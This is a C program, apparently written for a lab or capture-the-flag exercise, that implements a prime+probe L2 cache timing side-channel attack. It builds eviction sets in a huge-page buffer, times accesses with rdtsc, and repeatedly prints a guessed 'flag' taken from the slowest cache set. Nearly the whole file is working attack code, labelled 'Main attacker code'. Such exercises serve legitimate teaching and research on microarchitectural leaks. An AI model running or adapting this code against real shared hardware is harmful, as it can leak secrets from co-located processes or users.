#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define NUM_L2_CACHE_SETS 1024    // adjust if your L2 cache has a different number of sets
#define WAYS 16                  // number of ways in your L2

// --- Helper functions ---

// Read timestamp counter
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    asm volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

// Allocate a buffer in a huge page
char* get_buffer() {
    size_t size = 2 * 1024 * 1024; // 2MB huge page
    char *buf = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE, -1, 0);
    if (buf == (void*)-1) {
        perror("mmap buffer");
        exit(1);
    }
    *((char*)buf) = 1; // touch memory to allocate
    return buf;
}

// Fill an eviction set with 16 addresses that map to the same L2 cache set
void get_partial_eviction_set(char *buf, char *eviction_set[WAYS], int set_index) {
    for (int i = 0; i < WAYS; i++) {
        eviction_set[i] = buf + (i << 16) + (set_index << 6);  // i*64KB + set_index*64B
    }
}

// --- Main attacker code ---
int main() {
    char *buf = get_buffer();  // lab-provided buffer
    char *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

    // Build eviction sets for all cache sets
    for (int i = 0; i < NUM_L2_CACHE_SETS; i++)
        get_partial_eviction_set(buf, eviction_sets[i], i);

    while (1) {

    int scores[NUM_L2_CACHE_SETS] = {0};

    // repeat measurement multiple times to reduce noise
    for (int r = 0; r < 50; r++) {

        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {

            uint64_t start = rdtsc();

            volatile char tmp;
            for (int j = 0; j < WAYS; j++)
                tmp = *(eviction_sets[set][j]);

            uint64_t end = rdtsc();

            scores[set] += (end - start);
        }
    }

    int guessed_flag = 0;
    for (int i = 1; i < NUM_L2_CACHE_SETS; i++)
        if (scores[i] > scores[guessed_flag])
            guessed_flag = i;

        printf("Guessed flag: %d\n", guessed_flag);
        fflush(stdout);
        usleep(500000); // half-second delay between guesses
    }

    return 0;
}